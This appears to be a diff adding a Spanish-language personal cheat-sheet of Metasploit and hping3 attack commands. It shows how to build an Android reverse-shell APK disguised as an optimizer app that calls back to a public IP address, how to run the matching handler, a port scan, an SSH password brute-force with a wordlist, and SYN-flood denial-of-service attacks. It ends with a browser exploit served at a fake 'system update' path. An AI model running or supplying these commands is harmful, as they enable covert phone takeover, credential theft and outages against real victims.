@@ -1,0 +1,51 @@
+módulo payload 
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=190.97.236.79 LPORT=8080 R > optimizar.apk 
+
+
+ls -l fotos_video.apk ✓
+
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 190.97.233.53
+set LPORT 4444
+run ✓
+
+           escanear puerto
+
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.0.1
+set PORTS 1-1000
+set THREADS 20
+run✓
+
+            desiftador de clavé
+
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.0.1
+set USERNAME admin
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE true
+set THREADS 15
+run ✓
+
+          ataque por saturación 
+
+use auxiliary/dos/tcp/synflood
+set RHOST [IP_DEL_OBJETIVO]
+set RPORT 22
+set SHOOTUP 100
+run
+
+sudo hping3 -S --flood -V -p 80 192.168.0.1 ✓
+
+          mestaploit comando 
+
+msfconsole search use <module name> search tomcat
+
+use exploit/android/browser/webview_addjavascriptinterface
+set PAYLOAD android/meterpreter/reverse_tcp
+set URIPATH /actualizacion-sistema
+set SRVHOST 192.168.0.106
+set LHOST 192.168.0.106
+exploit
